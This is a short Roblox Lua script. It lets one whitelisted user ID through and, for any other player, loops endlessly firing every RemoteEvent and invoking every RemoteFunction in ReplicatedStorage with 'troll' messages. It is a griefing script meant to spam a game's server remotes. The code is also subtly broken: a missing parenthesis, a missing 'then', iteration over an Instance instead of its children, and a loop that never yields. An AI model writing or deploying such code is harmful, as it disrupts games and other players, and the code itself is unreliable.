local whitelist = {
  121363098
}

if table.find(whitelist, game:GetService('Players').LocalPlayer.UserId) then
  return true
else
  while true do
    for _, v in ipairs(game:GetService('ReplicatedStorage') do
        if v:IsA('RemoteEvent') v:FireServer('trolled') elseif v:IsA('RemoteFunction') then task.defer(v.InvokeServer, v, 'troll') end
    end
  end
end
